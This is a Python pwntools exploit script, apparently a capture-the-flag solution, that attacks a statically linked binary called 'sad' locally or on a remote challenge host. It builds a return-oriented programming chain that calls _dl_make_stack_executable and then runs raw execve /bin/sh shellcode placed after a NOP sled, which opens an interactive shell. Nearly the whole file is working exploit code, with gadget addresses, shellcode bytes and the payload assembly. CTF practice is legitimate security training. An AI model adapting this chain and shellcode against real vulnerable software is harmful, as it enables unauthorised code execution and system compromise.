from pwn import *

local = True

if local == True:
    elf = ELF('./sad')
    p = elf.process()
else:
    p = remote("jh2i.com", 50002)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
log.info(len(shellcode))
nops = b'\x90'*(264) #- len(shellcode))

with open("symbols.txt", "w") as f:
    f.write(str(elf.symbols.keys()))

rbp = p64(0x402d00)
pop_rsi_ret = p64(0x407aae) #pop rrsi; ret
pop_rax_ret = p64(0x43f8d7) #pop eax; ret
pop_rcx_ret = p64(0x4073e3) #pop rcx; ret
pop_rsp_ret = p64(0x40299b) #pop rsp; ret
pop_rdi_ret = p64(0x403434) #pop rdi ; ret
mov_rsi_ret = p64(0x46b8a5) #mov qword ptr [rsi] ; rax ; ret
addr_exec_stack = p64(elf.symbols['_dl_make_stack_executable'])
print("_dl_make_stack_executable function location: " + str(addr_exec_stack))
addr_stack_prot = p64(elf.symbols['__stack_prot'])
print("Stack prot variable: " + str(addr_stack_prot))
libc_stack_end = p64(elf.symbols['__libc_stack_end'])
print("Stack end: " + str(libc_stack_end))

payload = nops
payload += pop_rsi_ret
payload += addr_stack_prot
payload += pop_rax_ret
payload += p64(0x7)
# payload += mov_rsi_ret

payload += pop_rdi_ret
payload += libc_stack_end
payload += addr_exec_stack
# payload += pop_rsp_ret
payload += shellcode


with open("payload.txt", "wb") as f:
    f.write(payload)
#leave_ret = p64(0x401e25)

# print(elf.symbols['puts'])
# payload = shellcode + nops + leave_ret + addr


p.recvuntil("This is a really big binary. Hope you have everything you need ;)")
p.sendline(payload)
p.interactive()


